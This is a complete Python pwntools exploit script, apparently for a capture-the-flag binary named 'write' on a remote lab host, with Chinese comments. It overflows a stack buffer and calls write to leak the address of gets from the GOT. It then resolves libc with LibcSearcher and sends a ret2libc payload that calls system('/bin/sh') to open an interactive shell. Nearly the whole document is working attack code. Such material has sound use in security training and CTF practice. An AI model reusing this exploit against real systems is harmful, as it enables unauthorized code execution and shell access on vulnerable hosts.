#!/usr/bin/env python3

from pwn import *
from LibcSearcher import * #直接搜libc版本,但是不见得一定能搜到,最好手动https://libc.blukat.me/

context(arch = "i386", os = "linux", log_level='debug')
p = remote("10.212.27.23", 19146)
#p = process("./write")
e = ELF("./write")

write_plt_addr = e.plt["write"]
gets_got_addr = e.got["gets"]
vul_addr = e.symbols["vul"]

offset = 22
payload1 = offset * b'a' + p32(write_plt_addr) + p32(vul_addr) + p32(1) + p32(gets_got_addr) + p32(4)
# 溢出 + 调用write函数 + 压入返回值为这个vul函数 + 压入write的三个参数
p.sendlineafter("hello\n", payload1)

gets_addr = p.recv(4)
print(gets_addr)
gets_addr = u32(gets_addr)

libc = LibcSearcher('gets',gets_addr)
libc_base = gets_addr - libc.dump("gets")
system_addr = libc_base + libc.dump("system")
bin_sh_addr = libc_base + libc.dump("str_bin_sh")

payload2 = offset * b'a' + p32(system_addr) + p32(0) + p32(bin_sh_addr)

p.sendline(payload2)
p.interactive()